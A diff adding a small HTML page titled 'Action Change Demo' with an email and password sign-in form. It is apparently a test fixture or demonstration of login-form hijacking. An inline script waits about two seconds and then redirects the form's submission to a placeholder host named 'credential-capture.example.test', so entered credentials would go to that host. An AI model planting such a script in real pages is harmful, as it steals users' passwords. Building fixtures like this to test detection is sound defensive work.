@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Action Change Demo</title>
+  </head>
+  <body>
+    <main>
+      <h1>Account sign in</h1>
+      <form id="login-form" method="post" action="/action-change/session">
+        <label for="change-email">Email</label>
+        <input id="change-email" name="email" type="email" autocomplete="username" />
+
+        <label for="change-password">Password</label>
+        <input id="change-password" name="password" type="password" autocomplete="current-password" />
+
+        <button type="submit">Continue</button>
+      </form>
+    </main>
+
+    <script>
+      window.setTimeout(() => {
+        document
+          .getElementById("login-form")
+          .setAttribute("action", "https://credential-capture.example.test/changed-session");
+      }, 2200);
+    </script>
+  </body>
+</html>
